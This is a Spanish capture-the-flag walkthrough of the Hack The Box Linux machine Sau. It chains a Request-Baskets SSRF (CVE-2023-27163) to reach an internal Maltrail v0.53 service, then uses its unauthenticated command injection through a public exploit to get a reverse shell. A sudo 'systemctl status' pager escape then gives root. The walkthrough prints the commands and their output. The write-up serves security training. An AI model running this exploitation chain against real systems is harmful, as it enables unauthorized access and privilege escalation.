![[Pasted image 20250505141106.png]]


**Publicado:** 06 de Mayo de 2025 
**Autor:** José Miguel Romero aka x3m1Sec 
**Dificultad:** ⭐ Fácil

## 📝 Descripción

Sau es una máquina Linux de dificultad fácil que demuestra la explotación de una vulnerabilidad SSRF (Server-Side Request Forgery) en Request-Baskets y una posterior vulnerabilidad de ejecución remota de comandos en Maltrail. Para la escalada de privilegios, se abusa de un binario que se puede ejecutar como root a través de sudo.

## 🚀 Metodología

La metodología seguida para comprometer la máquina Sau consiste en los siguientes pasos:

```mermaid
flowchart TD
    A[Reconocimiento Inicial] --> B[Escaneo de Puertos]
    B --> C{Análisis de Servicios}
    C --> D[Puerto 55555 - Request-Baskets]
    C --> E[Puertos Filtrados - 80, 8338]
    D --> F[Explotación de SSRF CVE-2023-27163]
    F --> G[Acceso al Servicio Maltrail v0.53 en puerto 80]
    G --> H[Explotación de RCE en Maltrail]
    H --> I[Obtención de Shell como usuario puma]
    I --> J[Verificación de permisos sudo]
    J --> K[Explotación de systemctl para escalar privilegios]
    K --> L[Obtención de Shell como root]
    L --> M[Captura de flags]
```



## 🔭 Reconocimiento

### Ping para verificación en base a TTL

```bash
❯ ping -c2 10.10.11.224         
PING 10.10.11.224 (10.10.11.224) 56(84) bytes of data.
64 bytes from 10.10.11.224: icmp_seq=1 ttl=63 time=50.3 ms
64 bytes from 10.10.11.224: icmp_seq=2 ttl=63 time=47.9 ms

--- 10.10.11.224 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 47.932/49.097/50.262/1.165 ms
```


> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.


### Escaneo de puertos

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```


```bash
echo $ports

22,80,8338,55555
```
### Enumeración de servicios

```bash
nmap -sC -sV -p$ports 10.10.11.224
```

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 05 May 2025 12:15:59 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 05 May 2025 12:15:41 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 05 May 2025 12:15:42 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
<SNIP>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


En base al escaneo de nmap verificamos que los puertos 22 y 55555 están abiertos mientras que el 80 y el 8338 están filtrados.

### 🌐 Enumeración Web

http://10.10.11.224:55555/web

![[Pasted image 20250505142025.png]]

Descubrimos que se trata de un http collector para testear webhooks, notificaciones, etc:

https://github.com/darklynx/request-baskets

La versión de este proyecto (1.2.1) parece que tiene una vulnerabildad a SSRF y hay algunos exploits públicos:

https://vulners.com/packetstorm/PACKETSTORM:174128

## 🔍 Análisis de Vulnerabilidades

### Request-Baskets SSRF (CVE-2023-27163)

Esta vulnerabilidad permite a un atacante realizar solicitudes desde el servidor hacia destinos internos que normalmente no serían accesibles desde el exterior. En el caso de Sau, esto nos permitió acceder a servicios filtrados como el puerto 80 donde se ejecutaba Maltrail.

Las principales características de esta vulnerabilidad son:

- Permite la redirección de peticiones HTTP a servidores internos
- No requiere autenticación para crear "cestas" que actúan como proxies
- Facilita la evasión de restricciones de firewall internas

CVE-2023–27163 representa una vulnerabilidad crítica de Server-Side Request Forgery (SSRF) que se identificó en Request-Baskets, afectando a todas las versiones hasta e incluyendo [1.2.1](https://github.com/advisories/GHSA-58g2-vgpg-335q). Esta vulnerabilidad en particular otorga a los actores maliciosos la capacidad de obtener acceso no autorizado a los recursos de la red e información confidencial explotando el `/api/baskets/{name}` componente a través de solicitudes API cuidadosamente diseñadas.


![[Pasted image 20250505151156.png]]


### ¿Cómo funciona?

 Request-Baskets funciona como una aplicación web diseñada para recopilar y registrar solicitudes HTTP entrantes dirigidas a puntos finales específicos conocidos como “cestas.” Durante la creación de estas cestas, los usuarios tienen la flexibilidad de especificar servidores alternativos a los que se deben reenviar estas solicitudes. El problema crítico aquí radica en el hecho de que los usuarios pueden especificar inadvertidamente los servicios a los que no deberían tener acceso, incluidos los que normalmente están restringidos dentro de un entorno de red.

Por ejemplo, considere un escenario en el que el servidor aloja Solicitar-Cajas en el puerto 55555 y simultáneamente ejecuta un servidor web Flask en el puerto 8000. El servidor Flask, sin embargo, está configurado para interactuar exclusivamente con el localhost. En este contexto, un atacante puede explotar la vulnerabilidad SSRF creando una cesta que reenvía solicitudes a `http://localhost:8000`, evitando efectivamente las restricciones de red anteriores y obteniendo acceso al servidor web de Flask, que debería haberse restringido solo al acceso local.

### PoC

En este contexto, vimos que había algunos puertos de la aplicación filtrados (80 y 8338), quizás si conseguimos explotar la vulnerabilidad SSRF en este puerto podamos redirigir peticiones a los servicios de los otros puertos a los que no tenemos acceso.

La explotación del ataque SSRF nos puede permitir el acceso no autenticado a cualquier servidor HTTP conectado a la misma red que el servidor Request-Baskets.


En primer lugar creamos una cesta para intentar aprovechar la vulnerabilidad SSRF para enumerar los servicios internos que se ejecutan en la máquina internos que se ejecutan en la máquina.:

![[Pasted image 20250505151959.png]]


Para comprobar si la instancia es vulnerable, primero iniciamos una escucha Netcat en el puerto 8000 e intentamos enviar una petición HTTP a nuestra IP.

```
nc -nlvp 8000
```

Ahora que ya  tenemos nuestro listener Netcat funcionando, podemos proceder a iniciar una petición para determinar si se ha establecido una conexión con nuestro listener. Para ello, debemos modificar la URL de solicitud dentro de la cesta creada para que coincida con la dirección IP de nuestra máquina atacante.

Hacemos clic en el signo de engranaje en la esquina superior izquierda de nuestra cesta para que aparezcan los ajustes de configuración.

![[Pasted image 20250505152316.png]]

Ahora podemos lanzar un curl para verificar que recibimos la petición en nuestro listener
```
curl http://10.10.11.224:55555/test
```


![[Pasted image 20250505152422.png]]
Ya que hemos descubierto que la instancia es vulnerable y el escaneo Nmap mostró el puerto 80 como filtrado, podemos usar esto para comprobar qué servicio se ejecuta en el puerto. 

Editaremos nuestra configuración proxy de nuevo y estableceremos la URL de reenvío en http://127.0.0.1:80 . También habilitaremos los siguientes ajustes:

![[Pasted image 20250505152835.png]]

Proxy Response - Esto permite que la cesta se comporte como un proxy completo: respuestas del servicio subyacente configurado en forward_url.
configurado en forward_url se devuelven a los clientes de las solicitudes originales. La configuración de
configuración de las respuestas de la cesta se ignora en este caso.

Expandir ruta de reenvío - Con esta opción, la ruta de la URL de reenvío se expandirá cuando la petición HTTP original contiene una ruta compuesta.


Ahora basta con acceder a: http://10.10.11.224:55555/web/test y accederemos con éxito al servicio del puerto 80 que estaba filtrado:

![[Pasted image 20250505152936.png]]

Al acceder al servicio, vemos que se trata de un servicio mailtrail v0.53 el cual parece que es vulnerable a Unauthenticated OS Command Injection (RCE):


#### Mailtrail -Unauthenticated OS Command Injection (RCE)

Maltrail versión 0.53 contiene una vulnerabilidad de inyección de comandos del sistema operativo que no requiere autenticación. Esta vulnerabilidad se encuentra en el parámetro `username` del endpoint de login, permitiendo ejecutar comandos arbitrarios en el servidor.

El vector de ataque consiste en:

1. Enviar una petición POST al endpoint `/login`
2. Inyectar comandos en el parámetro `username`
3. Los comandos se ejecutan con los privilegios del usuario que ejecuta el servicio Maltrail

https://github.com/spookier/Maltrail-v0.53-Exploit

```
python3 exploit.py 10.10.14.8 1234 http://10.10.11.224:55555/test
```

![[Pasted image 20250505153319.png]]

![[Pasted image 20250505153328.png]]

Hacemos un spawn de la tty:

```
SHELL=/bin/bash script -q /dev/null
```


Capturamos la flag del directorio /home/puma:

```
cat user.txt
*************c6911648d77c65eeec
puma@sau:~$ 
```


#### 🔐 Escalada de Privilegios

Verificamos si el usuario puma puede ejecutar algún binario como root:

```
puma@sau:~$ sudo -l

Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```


Podemos abusar de este binario para escalar privilegios tal como se describe en:
https://gtfobins.github.io/gtfobins/systemctl/

```
sudo /usr/bin/systemctl status trail.service
!sh
```

```
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# cat root.txt
cat root.txt
d9a74************56f54743813
```

![[Pasted image 20250505154052.png]]